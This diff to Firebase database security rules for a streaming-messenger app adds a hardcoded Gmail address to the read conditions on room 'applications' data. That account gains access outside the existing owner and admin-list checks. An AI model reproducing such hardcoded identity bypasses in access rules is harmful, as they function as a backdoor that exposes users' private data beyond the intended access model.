@@ -625,9 +625,9 @@
             }
           },
           "applications": {
-            ".read": "auth != null && (root.child('streamerMessenger').child('rooms').child($roomId).child('meta').child('ownerUid').val() === auth.uid || root.child('adminCenter/adminUids').child(auth.uid).val() === true)",
+            ".read": "auth != null && (root.child('streamerMessenger').child('rooms').child($roomId).child('meta').child('ownerUid').val() === auth.uid || root.child('adminCenter/adminUids').child(auth.uid).val() === true || auth.token.email === 'skftodwocks2@gmail.com')",
             "$uid": {
-              ".read": "auth != null && (auth.uid === $uid || root.child('streamerMessenger').child('rooms').child($roomId).child('meta').child('ownerUid').val() === auth.uid || root.child('adminCenter/adminUids').child(auth.uid).val() === true)",
+              ".read": "auth != null && (auth.uid === $uid || root.child('streamerMessenger').child('rooms').child($roomId).child('meta').child('ownerUid').val() === auth.uid || root.child('adminCenter/adminUids').child(auth.uid).val() === true || auth.token.email === 'skftodwocks2@gmail.com')",
               ".write": false
             }
           },
